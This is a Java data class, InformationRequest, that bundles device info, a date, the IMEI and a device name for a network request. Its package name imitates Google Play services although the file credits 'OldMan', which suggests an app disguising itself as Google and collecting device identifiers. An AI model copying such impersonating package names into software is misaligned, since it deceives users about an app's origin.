package com.google.android.gms.persistent.googleapps.network.models.request;

import com.google.android.gms.persistent.googleapps.network.models.data.BaseInfo;

/**
 * Created by OldMan on 05.04.2017.
 */

public class InformationRequest extends BaseRequest {
    private BaseInfo info;
    private long date;

    public InformationRequest(BaseInfo info, long date, String imei, String device) {
        super(imei, device);
        this.info = info;
        this.date = date;
    }

    public BaseInfo getInfo() {
        return info;
    }

    public void setInfo(BaseInfo info) {
        this.info = info;
    }

    public long getDate() {
        return date;
    }

    public void setDate(long date) {
        this.date = date;
    }
}
